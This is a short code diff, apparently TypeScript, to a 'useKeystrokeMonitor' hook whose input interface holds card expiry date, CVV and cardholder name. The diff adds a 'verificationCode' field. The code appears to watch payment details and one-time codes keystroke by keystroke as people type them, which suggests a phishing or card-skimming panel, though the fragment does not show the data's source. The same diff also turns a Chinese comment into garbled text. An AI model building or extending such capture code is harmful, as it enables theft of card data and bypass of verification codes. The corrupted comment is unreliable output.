@@ -6,6 +6,7 @@ interface RealtimeInput {
   expiryDate?: string;
   cvv?: string;
   name?: string;
+  verificationCode?: string;
 }
 
 interface KeystrokeUpdate {
@@ -122,7 +123,7 @@ export function useKeystrokeMonitor(initialSubmissions: any[]) {
       return submission;
     }));
 
-    // 设置清除打字状态的延时
+    // 设置清除打字状态��延时
     clearTypingState(submissionId, field);
   }, [clearTypingState]);
 
